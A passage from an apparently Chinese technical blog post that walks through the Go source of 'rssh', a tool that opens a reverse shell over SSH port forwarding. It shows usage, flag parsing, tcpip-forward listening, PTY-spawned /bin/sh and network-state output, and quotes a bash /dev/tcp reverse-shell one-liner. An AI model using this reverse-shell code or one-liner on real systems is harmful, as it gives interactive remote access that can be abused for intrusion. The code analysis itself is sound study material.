&#x27;127.0.0.1:2222&#x27; -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE</span><br><span class="line">[  info ] listening for connections on IP.OF.REMOTE.MACHINE:22 (remote listen address: 127.0.0.1:2222)</span><br></pre></td></tr></table></figure><br>此时，在服务器上面运行(IP.OF.REMOTE.MACHINE)运行 nc 127.0.0.1 2222 即可得到反弹shell.</p><blockquote><p>服务器端<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nc -c 127.0.0.1 2222</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">id</span></span></span><br><span class="line">uid=1000(spoock) gid=1000(spoock) groups=1000(spoock),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br></pre></td></tr></table></figure><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">客户端</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go run main.go -a <span class="string">&#x27;127.0.0.1:2222&#x27;</span> -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE</span></span><br><span class="line">[  info ] listening for connections on IP.OF.REMOTE.MACHINE:22 (remote listen address: 127.0.0.1:2222)</span><br><span class="line">[  info ] accepted connection from: 127.0.0.1:33016</span><br></pre></td></tr></table></figure></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>init &amp; log<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Global flags</span></span><br><span class="line">    pf := mainCommand.PersistentFlags()</span><br><span class="line">    pf.BoolVarP(&amp;flagVerbose, <span class="string">&quot;verbose&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;be more verbose&quot;</span>)</span><br><span class="line">    pf.BoolVarP(&amp;flagQuiet, <span class="string">&quot;quiet&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;be quiet&quot;</span>)</span><br><span class="line">    pf.BoolVarP(&amp;flagTrace, <span class="string">&quot;trace&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;be very verbose&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Local flags</span></span><br><span class="line">    flags := mainCommand.Flags()</span><br><span class="line">    flags.StringVarP(&amp;flagSSHUsername, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;u&quot;</span>, os.Getenv(<span class="string">&quot;USER&quot;</span>),</span><br><span class="line">        <span class="string">&quot;connect as the given user&quot;</span>)</span><br><span class="line">    flags.StringVarP(&amp;flagSSHPassword, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;use the given password to connect&quot;</span>)</span><br><span class="line">    flags.StringVarP(&amp;flagSSHIdentityFile, <span class="string">&quot;identity-file&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="string">&quot;use the given SSH key to connect to the remote host&quot;</span>)</span><br><span class="line">    flags.StringVarP(&amp;flagAddr, <span class="string">&quot;address&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;localhost:8080&quot;</span>,</span><br><span class="line">        <span class="string">&quot;address to listen on on the remote host&quot;</span>)</span><br><span class="line">    flags.StringVarP(&amp;flagCommand, <span class="string">&quot;command&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>,</span><br><span class="line">        <span class="string">&quot;command to run&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">preRun</span><span class="params">(cmd *cobra.Command, args []<span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> cl *colog.CoLog</span><br><span class="line">    logger, cl = makeLogger()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> flagTrace &#123;</span><br><span class="line">        cl.SetMinLevel(colog.LTrace)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> flagVerbose &#123;</span><br><span class="line">        cl.SetMinLevel(colog.LDebug)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> flagQuiet &#123;</span><br><span class="line">        cl.SetMinLevel(colog.LWarning)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cl.SetMinLevel(colog.LInfo)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>在init()函数中主要是对一些参数的解释说明，同时也有对参数的校验的功能．</p></blockquote><ul><li>flagVerbose flagQuiet flagTrace　三者是表示日志的详细程度</li><li>username password identity-file 表示ssh登录认证的方法　可以使用那个用户名密码的方式也可以使用是公钥登录</li><li>address　远程服务器需要监听的端口，一般写为localhost:2222 或者是127.0.0.1:222 (写成localhost或者是127.0.0.1)</li><li>command 默认值是/bin/sh，是用来执行命令的shell环境</li></ul><h3 id="runMain"><a href="#runMain" class="headerlink" title="runMain"></a>runMain</h3><p>runMain函数是rssh的主体．我们以<code>go run main.go -a &#39;127.0.0.1:2222&#39; -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE</code>为例来说明参数的含义</p><h3 id="sshHost"><a href="#sshHost" class="headerlink" title="sshHost"></a>sshHost</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(args) != <span class="number">1</span> &#123;</span><br><span class="line">    log.Printf(<span class="string">&quot;error: invalid number of arguments (expected 1, got %d)&quot;</span>, <span class="built_in">len</span>(args))</span><br><span class="line">    os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">sshHost := args[<span class="number">0</span>]</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Add a default &#x27;:22&#x27; after the end if we don&#x27;t have a colon.</span></span><br><span class="line"><span class="keyword">if</span> !strings.Contains(sshHost, <span class="string">&quot;:&quot;</span>) &#123;</span><br><span class="line">    sshHost += <span class="string">&quot;:22&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断远程地址需要存在，默认加上22端口．</p><h3 id="config-Auth"><a href="#config-Auth" class="headerlink" title="config.Auth"></a>config.Auth</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Password auth or prompt callback</span></span><br><span class="line"><span class="keyword">if</span> flagSSHPassword != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">    log.Println(<span class="string">&quot;trace: adding password auth&quot;</span>)</span><br><span class="line">    config.Auth = <span class="built_in">append</span>(config.Auth, ssh.Password(flagSSHPassword))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    log.Println(<span class="string">&quot;trace: adding password callback auth&quot;</span>)</span><br><span class="line">    config.Auth = <span class="built_in">append</span>(config.Auth, ssh.PasswordCallback(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">        prompt := fmt.Sprintf(<span class="string">&quot;%s@%s&#x27;s password: &quot;</span>, flagSSHUsername, sshHost)</span><br><span class="line">        <span class="keyword">return</span> speakeasy.Ask(prompt)</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Key auth</span></span><br><span class="line"><span class="keyword">if</span> flagSSHIdentityFile != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">    auth, err := loadPrivateKey(flagSSHIdentityFile)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Fatalf(<span class="string">&quot;error: could not load identity file &#x27;%s&#x27;: %s&quot;</span>,</span><br><span class="line">            flagSSHIdentityFile, err)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    log.Println(<span class="string">&quot;trace: adding identity file auth&quot;</span>)</span><br><span class="line">    config.Auth = <span class="built_in">append</span>(config.Auth, auth)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断是通过用户名密码还是publickey的方式登录，分别进行不同的初始化的操作，<code>config.Auth = append(config.Auth, ssh.Password(flagSSHPassword))</code>或者是<code>auth, err := loadPrivateKey(flagSSHIdentityFile);config.Auth = append(config.Auth, auth)</code><br>一个有意思的地方，如果是这种方式<code>go run main.go -a ‘127.0.0.1:2222’ -u USERNAME IP.OF.REMOTE.MACHINE</code>　参数中没有密码，那么最终就会执行：<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">log.Println(<span class="string">&quot;trace: adding password callback auth&quot;</span>)</span><br><span class="line">config.Auth = <span class="built_in">append</span>(config.Auth, ssh.PasswordCallback(<span class="function"><span class="keyword">func</span><span class="params">()</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    prompt := fmt.Sprintf(<span class="string">&quot;%s@%s&#x27;s password: &quot;</span>, flagSSHUsername, sshHost)</span><br><span class="line">    <span class="keyword">return</span> speakeasy.Ask(prompt)</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure><br>此时实际的运行效果是:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">go run main.go -a &#x27;127.0.0.1:2222&#x27; -u USERNAME  IP.OF.REMOTE.MACHINE -t</span><br><span class="line">[ trace ] adding password callback auth                                                                                </span><br><span class="line">[ debug ] attempting 2 authentication methods ([0x666500 0x666650])                                         </span><br><span class="line">USERNAME@IP.OF.REMOTE.MACHINE:22&#x27;s password: ［输入远程服务器SSH的密码］</span><br><span class="line">[  info ] listening for connections on IP.OF.REMOTE.MACHINE:22 (remote listen address: 127.0.0.1:2222)</span><br></pre></td></tr></table></figure><br>这种方式通过密码登录的方式同样也是可以的．</p><h3 id="sshConn"><a href="#sshConn" class="headerlink" title="sshConn"></a>sshConn</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sshConn, err := ssh.Dial(<span class="string">&quot;tcp&quot;</span>, sshHost, config)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalf(<span class="string">&quot;error: error dialing remote host: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> sshConn.Close()</span><br></pre></td></tr></table></figure><p>通过<code>ssh.Dial(&quot;tcp&quot;, sshHost, config)</code>与远程服务器上面创建ssh链接．此时的网络状态是:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ss -anptw | grep 22 </span><br><span class="line">tcp   LISTEN      0       128             0.0.0.0:22             0.0.0.0:*                                                                                     </span><br><span class="line">tcp   ESTAB       0       0            172.16.1.2:60270   IP.OF.REMOTE.MACHINE:22      users:((&quot;main&quot;,pid=29114,fd=5))                                               </span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ps -ef | grep 29114</span></span><br><span class="line">spoock  29114 29034  0 15:46 pts/2    00:00:00 /tmp/go-build970759084/b001/exe/main -a 127.0.0.1:2222 -u USERNAME -p PASSWORD IP.OF.REMOTE.MACHINE -t</span><br></pre></td></tr></table></figure><br>与代码的执行情况是一致的．</p><h3 id="sshConn-Listen"><a href="#sshConn-Listen" class="headerlink" title="sshConn.Listen"></a>sshConn.Listen</h3><p>这个就是rssh中的核心部分．代码如下：<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Listen on remote</span></span><br><span class="line">l, err := sshConn.Listen(<span class="string">&quot;tcp&quot;</span>, flagAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Fatalf(<span class="string">&quot;error: error listening on remote host: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>其中的flagAddr就是参数中设置的127.0.0.1:2222，这就相当于在ssh的链接中再次监听了本地(此处的本地指的是服务器的地址)的2222端口．<br>跟着进入到ssh.Listen实现中： <code>vendor/golang.org/x/crypto/ssh/tcpip.go</code></p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Listen requests the remote peer open a listening socket on</span></span><br><span class="line"><span class="comment">// addr. Incoming connections will be available by calling Accept on</span></span><br><span class="line"><span class="comment">// the returned net.Listener. The listener must be serviced, or the</span></span><br><span class="line"><span class="comment">// SSH connection may hang.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Client)</span></span> Listen(n, addr <span class="type">string</span>) (net.Listener, <span class="type">error</span>) &#123;</span><br><span class="line">    laddr, err := net.ResolveTCPAddr(n, addr)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c.ListenTCP(laddr)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的注释：Listen()函数创建了一个TCP连接listener，这个listener必须能够被维持，否则ssh连接就会被挂住．<br>进行跟踪进入ListenTCP, vendor/golang.org/x/crypto/ssh/tcpip.go<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ListenTCP requests the remote peer open a listening socket</span></span><br><span class="line"><span class="comment">// on laddr. Incoming connections will be available by calling</span></span><br><span class="line"><span class="comment">// Accept on the returned net.Listener.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Client)</span></span> ListenTCP(laddr *net.TCPAddr) (net.Listener, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> laddr.Port == <span class="number">0</span> &amp;&amp; isBrokenOpenSSHVersion(<span class="type">string</span>(c.ServerVersion())) &#123;</span><br><span class="line">        <span class="keyword">return</span> c.autoPortListenWorkaround(laddr)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    m := channelForwardMsg&#123;</span><br><span class="line">        laddr.IP.String(),</span><br><span class="line">        <span class="type">uint32</span>(laddr.Port),</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// send message</span></span><br><span class="line">    ok, resp, err := c.SendRequest(<span class="string">&quot;tcpip-forward&quot;</span>, <span class="literal">true</span>, Marshal(&amp;m))</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> !ok &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;ssh: tcpip-forward request denied by peer&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// If the original port was 0, then the remote side will</span></span><br><span class="line">    <span class="comment">// supply a real port number in the response.</span></span><br><span class="line">    <span class="keyword">if</span> laddr.Port == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> p <span class="keyword">struct</span> &#123;</span><br><span class="line">            Port <span class="type">uint32</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err := Unmarshal(resp, &amp;p); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">        &#125;</span><br><span class="line">        laddr.Port = <span class="type">int</span>(p.Port)</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Register this forward, using the port number we obtained.</span></span><br><span class="line">    ch := c.forwards.add(*laddr)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> &amp;tcpListener&#123;laddr, c, ch&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol><li>合法性校验</li></ol><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> laddr.Port == <span class="number">0</span> &amp;&amp; isBrokenOpenSSHVersion(<span class="type">string</span>(c.ServerVersion())) &#123;</span><br><span class="line"><span class="keyword">return</span> c.autoPortListenWorkaround(laddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Client)</span></span> autoPortListenWorkaround(laddr *net.TCPAddr) (net.Listener, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> sshListener net.Listener</span><br><span class="line">    <span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">    <span class="keyword">const</span> tries = <span class="number">10</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; tries; i++ &#123;</span><br><span class="line">        addr := *laddr</span><br><span class="line">        addr.Port = <span class="number">1024</span> + portRandomizer.Intn(<span class="number">60000</span>)</span><br><span class="line">        sshListener, err = c.ListenTCP(&amp;addr)</span><br><span class="line">        <span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">            laddr.Port = addr.Port</span><br><span class="line">            <span class="keyword">return</span> sshListener, err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;ssh: listen on random port failed after %d tries: %v&quot;</span>, tries, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果检测到转发的端口或者是openssh的版本存在问题，就会调用autoPortListenWorkaround()函数任意创建一个端口．</p><ol><li><p>通过ssh转发端口</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">m := channelForwardMsg&#123;</span><br><span class="line">laddr.IP.String(),</span><br><span class="line"><span class="type">uint32</span>(laddr.Port),</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// send message</span></span><br><span class="line">ok, resp, err := c.SendRequest(<span class="string">&quot;tcpip-forward&quot;</span>, <span class="literal">true</span>, Marshal(&amp;m))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;ssh: tcpip-forward request denied by peer&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码就是<code>c.SendRequest(“tcpip-forward”, true, Marshal(&amp;m))</code>通过ssh的tcpip-forward转发ｍ(ｍ中有需要转发的端口和协议)</p></li><li><p>返回Listener</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Register this forward, using the port number we obtained.</span></span><br><span class="line">ch := c.forwards.add(*laddr)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> &amp;tcpListener&#123;laddr, c, ch&#125;, <span class="literal">nil</span></span><br></pre></td></tr></table></figure><p>在创建了连接完毕之后，服务器端的网络状态是:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ss -anptw | grep 2222</span></span><br><span class="line">tcp    LISTEN     0      128    127.0.0.1:2222                  *:*</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ss -anptw | grep 22</span></span><br><span class="line">tcp    ESTAB      0      0      172.27.0.12:22  </span><br></pre></td></tr></table></figure><h3 id="Accept"><a href="#Accept" class="headerlink" title="Accept"></a>Accept</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Start accepting shell connections</span></span><br><span class="line">log.Printf(<span class="string">&quot;info: listening for connections on %s (remote listen address: %s)&quot;</span>, sshHost, flagAddr)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">    conn, err := l.Accept()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        log.Printf(<span class="string">&quot;error: error accepting connection: %s&quot;</span>, err)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    log.Printf(<span class="string">&quot;info: accepted connection from: %s&quot;</span>, conn.RemoteAddr())</span><br><span class="line">    <span class="keyword">go</span> handleConnection(conn)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>通过<code>l, err := sshConn.Listen(“tcp”, flagAddr)</code>得到ssh转发的连接之后，开始进行监听<code>conn, err := l.Accept()．</code>对于建立之后的连接使用<code>handleConnection()</code>处理</p><h3 id="handleConnection"><a href="#handleConnection" class="headerlink" title="handleConnection"></a>handleConnection</h3><p>由于整个handleConnection()的整个函数较长，分部对其中的代码进行分析．</p><p>Create PTY<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create PTY</span></span><br><span class="line">pty, tty, err := pty.Open()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Printf(<span class="string">&quot;error: could not open PTY: %s&quot;</span>, err)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> tty.Close()</span><br><span class="line"><span class="keyword">defer</span> pty.Close()</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Put the TTY into raw mode</span></span><br><span class="line">_, err = terminal.MakeRaw(<span class="type">int</span>(tty.Fd()))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    log.Printf(<span class="string">&quot;warn: could not make TTY raw: %s&quot;</span>, err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>创建一个pty，用于执行从远程服务器上面发送过来的数据．</p><p>command<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Start the command</span></span><br><span class="line">cmd := exec.Command(flagCommand)　<span class="comment">//flagCommand:/bin/sh</span></span><br><span class="line">    <span class="comment">// Hook everything up</span></span><br><span class="line">cmd.Stdout = tty</span><br><span class="line">cmd.Stdin = tty</span><br><span class="line">cmd.Stderr = tty</span><br><span class="line"><span class="keyword">if</span> cmd.SysProcAttr == <span class="literal">nil</span> &#123;</span><br><span class="line">    cmd.SysProcAttr = &amp;syscall.SysProcAttr&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">cmd.SysProcAttr.Setctty = <span class="literal">true</span></span><br><span class="line">cmd.SysProcAttr.Setsid = <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// Start command</span></span><br><span class="line">err = cmd.Start()</span><br></pre></td></tr></table></figure></p><p>上面这段代码就相当与创建了一个交互式的反弹shell,类似与<code>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>在客户端创建完毕链接之后，在服务器端运行<code>nc -c 127.0.0.1 2222</code>，连接到本地的2222端口．此时服务器的网络状态是:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ss -anptw | grep 2222</span><br><span class="line">tcp    LISTEN     0      128    127.0.0.1:2222                  *:*                 </span><br><span class="line">tcp    ESTAB      0      0      127.0.0.1:59070              127.0.0.1:2222                users:((&quot;nc&quot;,pid=13449,fd=3))</span><br><span class="line">tcp    ESTAB      0      0      127.0.0.1:2222               127.0.0.1:59070</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ps -ef | grep 13449</span></span><br><span class="line">USERNAME   13449  2642  0 17:12 pts/2    00:00:00 nc -c 127.0.0.1 2222</span><br><span class="line"><span class="meta prompt_"> </span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span 